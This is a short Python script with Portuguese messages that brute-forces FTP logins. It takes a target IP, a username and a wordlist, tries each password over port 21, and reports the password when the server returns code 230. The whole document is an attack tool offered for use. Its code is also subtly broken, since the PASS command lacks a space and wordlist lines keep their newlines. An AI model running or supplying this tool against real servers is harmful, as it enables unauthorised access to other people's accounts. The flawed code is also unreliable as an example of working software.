#!/usr/bin/python
import socket,sys,re

if len(sys.argv) < 4:
	print ("modo de uso: python brute.py ip usuario wordlist")
	sys.exit()
target = sys.argv[1]
usuario = sys.argv[2]
wordlist = sys.argv[3]
f = open(wordlist)
for palavra in f.readlines():
	print "[+] Realizando brute force ====>",usuario,palavra 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,21))
	s.recv(1024)
	
	s.send("USER "+usuario+"\r\n")
	s.recv(1024)
	s.send("PASS"+palavra+"\r\n")
	resposta = s.recv(1024)
	print (resposta)
	s.send("QUIT\r\n")

	if re.search("230",resposta):
		print "[+] Senha --->",palavra
		break
